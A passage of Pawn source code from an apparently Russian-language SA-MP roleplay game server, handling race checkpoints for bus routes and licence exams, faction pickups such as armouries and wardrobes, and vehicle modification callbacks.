					g_player_skills[playerid][S_B_FLIGHTS] ++;
					SavePlayerSkills(playerid);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 30);
				if(pPressed[playerid] == 0 || pPressed[playerid] == 3 || pPressed[playerid] == 13 || pPressed[playerid] == 19 || pPressed[playerid] == 23 || pPressed[playerid] == 27) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],5.0);
			}
		}
		if(type == 5)
		{
			if(pPressed[playerid] == 9 || pPressed[playerid] == 46 || pPressed[playerid] == 81  || pPressed[playerid] == 91)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
				    new string[100];
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, sizeof(string), "Маршрутка по маршруту %s отправляется через 10 секунд",name);
					AutoStationBusInfo(playerid, string);
					GameTextForPlayer(playerid, "~r~СТОП", 1000, 1);
					PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				}
				else
				{
					if(pPressed[playerid] == 91) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusLS[i][0],BusLS[i][1],BusLS[i][2],BusLS[i][3],BusLS[i][4],BusLS[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);

					g_player_skills[playerid][S_B_FLIGHTS] ++;
					SavePlayerSkills(playerid);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 30);
				if(pPressed[playerid] == 9 || pPressed[playerid] == 46 || pPressed[playerid] == 81 || pPressed[playerid] == 91) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusLS[i][0],BusLS[i][1],BusLS[i][2],BusLS[i][3],BusLS[i][4],BusLS[i][5],5.0);
			}
		}
	}
	if(GetPVarInt(playerid, "DrivingTest") > 0)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_RED, "Вы должны находиться за рулем!");
		if(pPressed[playerid] == 22)
		{
			if(GetPVarInt(playerid, "DrivingTestError") > 2)
			{
				SendClientMessage(playerid, COLOR_RED, "Вы допустили больше 2 ошибок и провалили экзамен!");
			}
			else
			{
				SendClientMessage(playerid, C_BLUE, "Поздравляем! Вы успешно сдали практический экзамен и получили водительские права!");
				SendClientMessage(playerid, C_BLUE, "Посмотреть свои лицензии можно через команду - /lic");
				g_player_skills[playerid][S_LICS][0] = 1;

				SavePlayerSkills(playerid);
			}
			DeletePVar(playerid, "DrivingTest");
			DeletePVar(playerid, "DrivingTestHealth");
			DeletePVar(playerid, "DrivingTestError");
			SetVehicleData(GetPlayerVehicleID(playerid), veh_fuel, 45);
			SetVehicleData(GetPlayerVehicleID(playerid), veh_health, 1000);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DisablePlayerRaceCheckpoint(playerid);
		}
		else
		{
			pPressed[playerid]++;
			new Float:health, i = pPressed[playerid];
			GetVehicleHealth(GetPlayerVehicleID(playerid), health);
			if(health < GetPVarFloat(playerid, "DrivingTestHealth"))
			{
			    new fmt_info[55];
				format(fmt_info, sizeof fmt_info, "Вы повредили транспорт. Ошибок: {ffffff}%i", GetPVarInt(playerid, "DrivingTestError") + 1);
				SendClientMessage(playerid, COLOR_RED, fmt_info);
				SetPVarInt(playerid, "DrivingTestError", GetPVarInt(playerid, "DrivingTestError") + 1);
			}
			if(SpeedVehicle(playerid) / 2 > 60)
			{
				new fmt_info[60];
				format(fmt_info, sizeof fmt_info, "Вы привысили скорость. Ошибок: {ffffff}%i", GetPVarInt(playerid, "DrivingTestError") + 1);
				SendClientMessage(playerid, COLOR_RED, fmt_info);
				SetPVarInt(playerid, "DrivingTestError", GetPVarInt(playerid, "DrivingTestError") + 1);
			}
			if(pPressed[playerid] < 27) SetPlayerRaceCheckpoint(playerid, 0, DrivingTest[i][0],DrivingTest[i][1],DrivingTest[i][2],DrivingTest[i][3],DrivingTest[i][4],DrivingTest[i][5], 5.0);
			else SetPlayerRaceCheckpoint(playerid,1, DrivingTest[i][0],DrivingTest[i][1],DrivingTest[i][2],DrivingTest[i][3],DrivingTest[i][4],DrivingTest[i][5], 5.0);
			SetPVarFloat(playerid, "DrivingTestHealth", health);
		}
	}
	if(GetPVarInt(playerid, "FlyTest") > 0)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, C_RED, "Вы должны находиться за рулем!");
		if(pPressed[playerid] == 12)
		{
			if(GetPVarInt(playerid, "FlyTestError") > 2)
			{
				SendClientMessage(playerid, C_RED, "Вы провалили экзамен на управление воздушным транспортом");
				ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{F04245}К сожалению Вы не сдали экзамен на управление воздушным транспортом\n\n", "Закрыть", "");
			}
			else
			{
				SendClientMessage(playerid, C_BLUE, "Поздравляем! Вы сдали экзамен на управление воздушным транспортом");
				ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{ffffff}Поздравляем, Вы сдали экзамен на управление воздушным транспортом\n\n", "Закрыть", "");
				g_player_skills[playerid][S_LICS][2] = 1;
			}
			DeletePVar(playerid, "FlyTest");
			DeletePVar(playerid, "FlyTestHealth");
			DeletePVar(playerid, "FlyTestError");
			new vehicleid = GetPlayerVehicleID(playerid);
			SetVehiclePos(vehicleid, g_vehicle[vehicleid][veh_x], g_vehicle[vehicleid][veh_y], g_vehicle[vehicleid][veh_z]);
			SetVehicleZAngle(vehicleid, g_vehicle[vehicleid][veh_a]);
			SetVehicleHealth(vehicleid, 1000.0);
			SetVehicleHealth(vehicleid, 1000.0);
			DisablePlayerRaceCheckpoint(playerid);
		}
		else
		{
			pPressed[playerid]++;
			new Float:health, i = pPressed[playerid];
			GetVehicleHealth(GetPlayerVehicleID(playerid), health);
			if(health < GetPVarFloat(playerid, "FlyTestHealth"))
			{
				new fmt_msg[50];

				format(fmt_msg, sizeof fmt_msg, "Вы повредили вертолёт. Ошибок: {ffffff}%i", GetPVarInt(playerid, "FlyTestError") + 1);
				SendClientMessage(playerid, COLOR_RED, fmt_msg);

				SetPVarInt(playerid, "FlyTestError", GetPVarInt(playerid, "FlyTestError") + 1);
			}
			if(pPressed[playerid] < 12) SetPlayerRaceCheckpoint(playerid, 3, FlyTest[i][0],FlyTest[i][1],FlyTest[i][2],FlyTest[i][3],FlyTest[i][4],FlyTest[i][5], 5.0);
			else SetPlayerRaceCheckpoint(playerid, 4, FlyTest[i][0],FlyTest[i][1],FlyTest[i][2],FlyTest[i][3],FlyTest[i][4],FlyTest[i][5], 5.0);
			SetPVarFloat(playerid, "FlyTestHealth", health);
		}
	}
	if(GetPVarInt(playerid, "WaterTest"))
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, C_RED, "Вы должны находиться за рулем!");
		if(pPressed[playerid] == 13)
		{
			if(GetPVarInt(playerid, "WaterTestError") > 2)
			{
				SendClientMessage(playerid, C_RED, "Вы провалили экзамен на управление водным транспортом");
				ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{F04245}К сожалению Вы не сдали экзамен на управление водным транспортом\n\n", "Закрыть", "");
			}
			else
			{
				SendClientMessage(playerid, C_BLUE, "Поздравляем! Вы сдали экзамен на управление водным транспортом");
				ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{ffffff}Поздравляем, Вы сдали экзамен на управление водным транспортом\n\n", "Закрыть", "");
				g_player_skills[playerid][S_LICS][1] = 1;
			}
			DeletePVar(playerid, "WaterTest");
			DeletePVar(playerid, "WaterTestTimeOn");
			DeletePVar(playerid, "WaterTestHealth");
			DeletePVar(playerid, "WaterTestError");
			new vehicleid = GetPlayerVehicleID(playerid);
			SetVehiclePos(vehicleid, g_vehicle[vehicleid][veh_x], g_vehicle[vehicleid][veh_y], g_vehicle[vehicleid][veh_z]);
			SetVehicleZAngle(vehicleid, g_vehicle[vehicleid][veh_a]);
			SetVehicleHealth(vehicleid, 1000.0);
			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerPos(playerid,-273.5092,1136.3909,8.7576);
			SetPlayerFacingAngle(playerid,242.2719);
		}
		else
		{
			pPressed[playerid]++;
			new Float:health, i = pPressed[playerid];
			GetVehicleHealth(GetPlayerVehicleID(playerid), health);
			if(health < GetPVarFloat(playerid, "WaterTestHealth"))
			{
				new fmt_msg[50];

				format(fmt_msg, sizeof fmt_msg, "Вы повредили лодку. Ошибок: {ffffff}%i", GetPVarInt(playerid, "WaterTestError") + 1);
				SendClientMessage(playerid, COLOR_RED, fmt_msg);

				SetPVarInt(playerid, "WaterTestError", GetPVarInt(playerid, "WaterTestError") + 1);
			}
			if(pPressed[playerid] < 13) SetPlayerRaceCheckpoint(playerid, 0, WaterTest[i][0],WaterTest[i][1],WaterTest[i][2],WaterTest[i][3],WaterTest[i][4],WaterTest[i][5], 5.0);
			else SetPlayerRaceCheckpoint(playerid, 1, WaterTest[i][0],WaterTest[i][1],WaterTest[i][2],WaterTest[i][3],WaterTest[i][4],WaterTest[i][5], 5.0);
			SetPVarFloat(playerid, "WaterTestHealth", health);
		}
	}
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
    return 0;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
    return 1;
}

public OnObjectMoved(objectid) return 1;
public OnPlayerObjectMoved(playerid, objectid) return 1;

forward PickupBack(playerid);
public PickupBack(playerid)
{
	pickupentered[playerid] = 0;
	return 1;
}

forward ResetAntiFloodPick(playerid);
public ResetAntiFloodPick(playerid) return SetPVarInt(playerid, "PickupID", -1);

public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	/*if(pickupid == licenses_pickup)
	{
		ShowPlayerDialog(playerid, D_BUY_LICENSES, DIALOG_STYLE_LIST, "{0080BB}Пробретение лицензий",
		"Управление наземным транспортом\t5000р\nУправление водным транспортом\t1000р\nУправление воздушным транспортом\t15000р\nЛицензия на оружие\t\t\t25000р\nЛицензия на бизнес\t\t\t100000",
		"Купить", "Закрыть");
		return 1;
	}*/

	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	/*for(new i; i < sizeof PresentObject; i ++)
	{
		if(pickupid == g_pickup_present[i])
		{
			if(PI[playerid][pPresent][pickupid] != 0)
				return SendClientMessage(playerid, C_RED, "Вы уже брали этот подарок");

			PI[playerid][pPresent][pickupid] = 1;

			SavePresents(playerid);

			PlayerReceivingPresent(playerid);
		}
	}*/
	if(pickupid == bank_money_pickup)
	{
		if(door_bank_status != 1)
			return 1;

		if(PI[playerid][P_BUG] == 1) return 1;

		if(IsACop(playerid))
		{
			SendClientMessage(playerid, C_OSNOV, "Вы подняли мешок с деньгами. Доставьте его до банка.");
			SetPlayerRaceCheckpoint(playerid, 1, 412.4670,575.1810,12.0120, 0.0, 0.0, 0.0, 3.0);
			SetPVarInt(playerid, "CheckpointGoToBank", 1);
			SetPlayerAttachedObject(playerid, 4, 1550, 1, 0.0000, -0.3319, 0.0000, 1.09, 91.20, 1.70, 1.00, 1.00, 1.00);

			PI[playerid][P_BUG] = 1;

			DestroyPickup(bank_money_pickup);

			bank_money_pickup = -1;
		}
		else if(IsAGang(playerid) || IsAMafia(playerid))
		{
			SetPlayerAttachedObject(playerid, 4, 1550, 1, 0.0000, -0.3319, 0.0000, 1.09, 91.20, 1.70, 1.00, 1.00, 1.00);

			SendClientMessage(playerid, C_OSNOV, "Вы подняли мешок с деньгами. Доставьте его до базы.");

			SetPlayerCheckpointToBase(playerid);

			PI[playerid][P_BUG] = 1;

			DestroyPickup(bank_money_pickup);

			bank_money_pickup = -1;
		}
	}
	if(pickupid == Pickup[2]) // lspd
	{
		if(PI[playerid][pMember] != TEAM_POLICIA) return SendClientMessage(playerid, C_RED, "Вы не состоите в полиции!");
	    ShowPlayerDialog(playerid, D_ARMOURY, DIALOG_STYLE_LIST, "Склад оружия", "1. АК-47\n2. Colt М1911\n3. Desert Eagle\n4. Colt M4\n5. Иж 72\n6. Жезл", "Выбрать", "Отмена");
		return 1;
	}
/*	if(pickupid == BottlePick)
	{
		if(PI[playerid][pLevel] > 3) return SendClientMessage(playerid, C_RED, "Сдача бутылок доступна до 3 уровня");
	    ShowPlayerDialog(playerid, D_ARMOURY, DIALOG_STYLE_LIST, "Склад оружия", "1. Патроны (60 шт.)\n2. Дубинка\n3. Colt М1911\n4. Desert Eagle\n5. Colt M4\n6. Иж 72\n7. Жезл", "Выбрать", "Отмена");
		return 1;
	}*/
	if(pickupid == fbipic[0])
	{
		if(PI[playerid][pMember] == TEAM_FBI)
		{
      		SendClientMessage(playerid, C_BLUE, "Вы надели бронижилет");
            SetPlayerArmour(playerid, 100);
		}
		else SendClientMessage(playerid, C_RED, "Вы не гос. служащий!");
	}
	if(pickupid == bootlepic)
	{
		if(PI[playerid][pBottles] == 0)
			return SendClientMessage(playerid, C_RED, "У Вас нет бутылок");

		new string[88];
 		format(string,sizeof(string),"{FFFFFF}Пункт приёма бутылок. Желаете сдать бутылки?\nНа данный момент у Вас:{FFCC00} %d", PI[playerid][pBottles]);
   		ShowPlayerDialog(playerid, DIALOG_DELIVERY_BOTTLE, DIALOG_STYLE_MSGBOX,"{FFCC00}Приём бутылок",string,"Да","Нет");
		ShowPlayerDialog
		(
			playerid, DIALOG_DELIVERY_BOTTLE, DIALOG_STYLE_MSGBOX,
			"{FFCC00}Приём бутылок",
			"{FFFFFF}Вы действительно желаете сдать бутылки?",
			"Да", "Нет"
		);
	}
	if(pickupid == fbipic[1]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_FBI)
        {
        	if(GetPVarInt(playerid, "razdfbi") > gettime()) return 1;
	    	if(PI[playerid][pRank] < 3) return SendClientMessage(playerid, C_RED, "Гардероб доступен с 3 рангаи выше!");
        	ShowPlayerDialog(playerid, 15420, DIALOG_STYLE_LIST, "Гардероб ФСБ", "Гражданская одежда\nСлужебная форма\nФорма 'Боевой Готовности'\nОдежда группировки 'Якудза'\nОдежда группировки 'Русская Мафия'\nОдежда группировки 'ОПГ Подольское'\nОдежда группировки 'ОПГ Тамбовское'", "Одеть", "Нет");
        	SetPVarInt(playerid, "razdfbi", gettime()+5);
     	}
	}
	if(pickupid == armshield)
	{
		if(PI[playerid][pMember] != TEAM_ARMIYA) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в Национальной Гвардии!");
		SendClientMessage(playerid,COLOR_GREEN,"Вы надели бронижилет");
        SetPlayerArmour(playerid, 100);
		return 1;
	}
	if(pickupid == armystol) // Столовая
	{
		if(PI[playerid][pMember] != TEAM_ARMIYA) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в Армии!");
		if(PI[playerid][pHunger] >= 100) return SendClientMessage(playerid, COLOR_GREY, "Вы не голодны!");
		PlayerPlaySound(playerid, 32200, 0.0, 0.0, 0.0);
		ClearAnimations(playerid);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
		if(PI[playerid][pHunger] <= 75) GiveHunger(playerid, 25);
    	else SetHunger(playerid, 100);
		if(PI[playerid][pSex] == 1) MeAction(playerid, "съел кусочек пиццы");
		else MeAction(playerid, "съела кусочек пиццы");
		return 1;
	}
	if(pickupid >= GetMedicines[0] && pickupid <= GetMedicines[2])
	{
        if(!IsAMedic(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
		if(Medicines[playerid] + Medicines[playerid] >= 10) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете взять более 10 комплектов медикаментов!");
		Medicines[playerid] += 10;
		SendClientMessage(playerid, COLOR_BLUE, "Вы взяли несколько комплектов медикаментов");
		if(PI[playerid][pSex] == 1) MeAction(playerid, "взял несколько комплектов медикаментов");
		else MeAction(playerid, "взяла несколько комплектов медикаментов");
		return 1;
	}
	if(pickupid == sportpickup)
	{
		if(gym_cloakroom[playerid]) ShowPlayerDialog(playerid, 6446, 0, "Спортзал", "{FFFFFF}\n\nВы хотите снять форму и закончить тренировку?\n\n", "Принять", "Отмена");
		else ShowPlayerDialog(playerid, 6446, 0, "Спортзал", "{FFFFFF}\n\nВы хотите надеть форму и начать тренировку?\nСтоимость тренировки: {63BD4E}500р\n\n", "Принять", "Отмена");
		return 1;
	}
	else if(pickupid == zavod[0]) //завод вход
    {
		SetPlayerPos(playerid, 2575.4194,-1290.1809,1044.1250);
    	SetPlayerFacingAngle(playerid, 90);
    	SetCameraBehindPlayer(playerid);
    	SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 2);
    }
   	else if(pickupid == zavod[1])
    {
		SetPlayerPos(playerid, -1008.0934,-693.1492,32.0078);
    	SetPlayerFacingAngle(playerid, 1.7245);
    	SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
	    SetPlayerInterior(playerid, 0);
    }
	if(pickupid == Pickup[1]) // Спецназ
	{
		if(PI[playerid][pMember] != TEAM_SWAT) return SendClientMessage(playerid, C_BLUE, "Вы не можете брать оружие!");
		ShowPlayerDialog(playerid, D_ARMOURY, DIALOG_STYLE_LIST, "Склад оружия", "АК-47\nColt М1911\nDesert Eagle\nColt M4\nИж 72\nБронижилет", "Выбрать", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[27]) // Армия
	{
		if(PI[playerid][pMember] != TEAM_ARMIYA) return SendClientMessage(playerid, C_BLUE, "Вы не можете брать оружие!");
		ShowPlayerDialog(playerid, D_ARMYGUN, DIALOG_STYLE_LIST, "Склад оружия", "АК-47\nColt М1911\nDesert Eagle\nColt M4\nИж 72", "Выбрать", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[3]) // ппс
	{
		if(PI[playerid][pMember] != TEAM_POLICIA2) return SendClientMessage(playerid, C_BLUE, "Вы не можете брать оружие!");
		ShowPlayerDialog(playerid, D_ARMOURY, DIALOG_STYLE_LIST, "Склад оружия", "АК-47\nColt М1911\nDesert Eagle\nColt M4\nИж 72", "Выбрать", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[4]) // fbi
	{
		if(PI[playerid][pMember] != TEAM_FBI) return 1;
		//ShowPlayerDialog(playerid, D_ARMOURY+2, DIALOG_STYLE_LIST, "Склад оружия", "Colt М1911\nDesert Eagle (35 пт.)\nM4A1 (150 пт.)\nMP5 (100 пт.)\nSniper Rifle (25 пт.)\nСпрей (100 мл.)\nДымовая шашка (5 шт.)\nДубинка", "Выбрать", "Отмена");
		ShowPlayerDialog(playerid, D_ARMOURY, DIALOG_STYLE_LIST, "Склад оружия", "АК-47\nColt М1911\nDesert Eagle\nColt M4\nИж 72", "Выбрать", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[7]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_SWAT)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[8]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_POLICIA)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[9]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_POLICIA2)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[11]) // Центр занятости
	{
	    if(PI[playerid][pMember]) return SendClientMessage(playerid, C_RED, "Вы состоите в организации!");
		ShowPlayerDialog(playerid, D_HEAL+17, DIALOG_STYLE_LIST, "Устройство на работу", "Водитель автобуса\t2 уровень\nВодитель такси\t2 уровень\nАвтомеханик\t3 уровень\nДальнобойщик\t6 уровень\nУволиться с работы", "выбрать", "Отмена");
	}
	if(pickupid == Pickup[19]) // Мэрия
	{
	    if(PI[playerid][pMember] != TEAM_MERIA) return 1;
	    //ShowPlayerDialog(playerid, D_ARMOURY+1, DIALOG_STYLE_LIST, "Склад оружия", "Colt М1911\nDesert Eagle (35 пт.)\nДубинка", "Выбрать", "Отмена");
	    ShowPlayerDialog(playerid, D_ARMOURY, DIALOG_STYLE_LIST, "Склад оружия", "Дубинка\nColt М1911\nDesert Eagle\nColt M4", "Выбрать", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[20]) // Бизнес центр
	{
	    ShowPlayerDialog(playerid, D_ARMOURY+3, DIALOG_STYLE_LIST, "Бизнес Центр", "Лицензия на бизнес 100.000р", "Купить", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[21]) // Обменник
	{
	    ShowPlayerDialog(playerid, D_ARMOURY+4, DIALOG_STYLE_MSGBOX, "Обменник", "{FFFFFF}- Вас приветствует магазин обмена\n\n{FFFFFF}Желаете выбить что нибудь за 40 подарков?", "Далее", "Отмена");
		return 1;
	}
	if(pickupid == Pickup[22]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_MERIA)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[23]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_BOLNICA)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[24]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_AUTOSCHOOL)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[25]) // Раздевалка
	{
        if(PI[playerid][pMember] == TEAM_SMI)
        {
       		if(GetPVarInt(playerid, "razd") > gettime()) return 1;
        	ShowPlayerDialog(playerid, 15421, DIALOG_STYLE_LIST, "Гардероб", "Гражданская одежда\nСлужебная форма", "Одеть", "Нет");
	       	SetPVarInt(playerid, "razd", gettime()+5);
     	}
	}
	if(pickupid == Pickup[26]) // Универ
	{
       	ShowPlayerDialog(playerid, D_UNIVER, DIALOG_STYLE_MSGBOX, "Университет", "{63BD4E}Требования:\n{FFFFFF}- Наличие паспорта\n- Наличие мед. справки\n\n{afafaf}Если все это у Вас есть, нажмите `Далее`", "Далее", "Отмена");
	}
	if(pickupid == Pickup[6])
	{
		new pdddialog[1900];
		format(pdddialog, sizeof(pdddialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", pdd_MSG[0], pdd_MSG[1], pdd_MSG[2], pdd_MSG[3], pdd_MSG[4], pdd_MSG[5], pdd_MSG[6], pdd_MSG[7]
		, pdd_MSG[8], pdd_MSG[9], pdd_MSG[10], pdd_MSG[11], pdd_MSG[12], pdd_MSG[13], pdd_MSG[14], pdd_MSG[15], pdd_MSG[16], pdd_MSG[17], pdd_MSG[18], pdd_MSG[19], pdd_MSG[20]
		, pdd_MSG[21], pdd_MSG[22]);
		//format(pdddialog, sizeof(pdddialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", pdd_MSG[0], pdd_MSG[1], pdd_MSG[2], pdd_MSG[3], pdd_MSG[4], pdd_MSG[5], pdd_MSG[6], pdd_MSG[7]
		//, pdd_MSG[8], pdd_MSG[9], pdd_MSG[10], pdd_MSG[11], pdd_MSG[12], pdd_MSG[13], pdd_MSG[14], pdd_MSG[15], pdd_MSG[16]);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"Правила Дорожного Движения", pdddialog, "Закрыть", "");
	}
	if(pickupid == narkoenter[0])
	{
	    FreezePlayer(playerid, 5000);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,410.5929,970.0229,12.1484);
		SetPlayerFacingAngle(playerid, 340.0959);
		SetPlayerVirtualWorld(playerid, 0);
		SetCameraBehindPlayer(playerid);
	}
	if(pickupid == narkoenter[1])
	{
	    FreezePlayer(playerid, 5000);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,524.1197,906.1184,0.6400);
		SetPlayerFacingAngle(playerid,130);
		SetPlayerVirtualWorld(playerid,0);
		SetCameraBehindPlayer(playerid);
	}
	/*if(pickupid == voenkomatpick[0])
	{
	    FreezePlayer(playerid, 5000);
	    SetPlayerInterior(playerid,0);
	    SetPlayerPos(playerid,-569.0129,-193.2260,2552.0200);
		SetPlayerFacingAngle(playerid,270.1083);
		SetPlayerVirtualWorld(playerid,0);
		SetCameraBehindPlayer(playerid);
	}
	if(pickupid == voenkomatpick[1])
	{
	    SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1915.4570,2302.0510,15.5697);
		SetPlayerFacingAngle(playerid,90.0008);
		SetPlayerVirtualWorld(playerid,0);
		SetCameraBehindPlayer(playerid);
	}*/
	if(pickupid == minerpick[0])
	{
		FreezePlayer(playerid, 2000);
		SetPlayerPos(playerid, 1529.9523,1434.2827,455.9069);
    	SetPlayerFacingAngle(playerid, 360);
    	SetCameraBehindPlayer(playerid);
    	SetPlayerVirtualWorld(playerid, 6);
		SetPlayerInterior(playerid, 0);
	}
	if(pickupid == minerpick[1])
	{
        FreezePlayer(playerid, 2000);
		SetPlayerPos(playerid, 2306.6931,1743.4159,1.7617);
    	SetPlayerFacingAngle(playerid, 1.7245);
    	SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
	    SetPlayerInterior(playerid, 0);
	}
    if(pickupid == armskin)
  	{
  	    if(PI[playerid][pMember] != TEAM_ARMIYA) return 1;
	    if(PI[playerid][pRank] < 2) return ShowPlayerDialog(playerid, 15419, DIALOG_STYLE_LIST, "Раздевалка", "Гражданская одежда\nСлужебная форма\nПостовая форма\nСпортивная форма\nПарадная форма", "Выбрать", "Отмена");
        ShowPlayerDialog(playerid, 15419, DIALOG_STYLE_LIST, "Раздевалка", "Гражданская одежда\nСлужебная форма\nПостовая форма\nСпортивная форма\nПарадная форма", "Выбрать", "Отмена");
    }
	if(pickupid == opg1pick[0]) // медики вход ls
	{
	    FreezePlayer(playerid, 5000);
		SetPlayerInterior(playerid,6);
		SetPlayerPos(playerid,2557.1355,-1852.6779,2522.8401);
		SetPlayerFacingAngle(playerid, 354.1457);
		SetPlayerVirtualWorld(playerid, 6);
	}
	if(pickupid == opg1pick[1]) // медики вход ls
	{
		FreezePlayer(playerid, 5000);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-2635.1584,2910.7021,37.6400);
		SetPlayerFacingAngle(playerid, 90.1457);
		SetPlayerVirtualWorld(playerid, 0);
	}

	if(pickupid == bolnicapick[0]) // медики вход арз
	{
		FreezePlayer(playerid, 1500);
		SetPlayerPos(playerid, 1199.6838,-614.9686,998.0547);
    	SetPlayerFacingAngle(playerid, 1.0475);
    	SetCameraBehindPlayer(playerid);
    	SetPlayerVirtualWorld(playerid, 4);
		SetPlayerInterior(playerid, 6);
	}
   	if(pickupid == bolnicapick[1]) // медики выход
    {
        if(PI[playerid][pHeal] <= 75 && PlayerDied[playerid] == true) return SendClientMessage(playerid, C_RED, "Вы находитесь на лечении");
        FreezePlayer(playerid, 1500);
		SetPlayerPos(playerid, 440.0090,1563.2480,12.0028);
    	SetPlayerFacingAngle(playerid, 316.6323);
    	SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
	    SetPlayerInterior(playerid, 0);
    }
	if(pickupid == Pickup[0]) return ShowPlayerDialog(playerid, D_JOINCARS, 0, "Автосалон", "{FFFFFF}Вас приветствует автосалон !\nПерейти к покупке транспорта?", "Перейти", "Закрыть");
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	switch(componentid)
	{
		case 1008..1010: if(IsPlayerInInvalidNosVehicle(playerid)) RemoveVehicleComponent(vehicleid, componentid);
	}

	if(!IsComponentidCompatible(GetVehicleModel(vehicleid), componentid)) RemoveVehicleComponent(vehicleid, componentid);

	RemoveVehicleComponent(vehicleid,componentid);
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
    //if(GetPlayerInterior(playerid) == 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return SKick(playerid, 6345);
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	/*if(GetPlayerInterior(playerid) == 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(GetPlayerHouse(playerid) && PI[playerid][PlayerCarID][0] == vehicleid)
		{
			PI[playerid][cColor][0] = color1;
			PI[playerid][cColor][1] = color2;
		}
		else
		{
			SKick(playerid, 1442);
		}
		if(GetPlayerHouse(playerid) && PI[playerid][PlayerCarID][1] == vehicleid)
		{
			PI[playerid][cColor1][0] = color1;
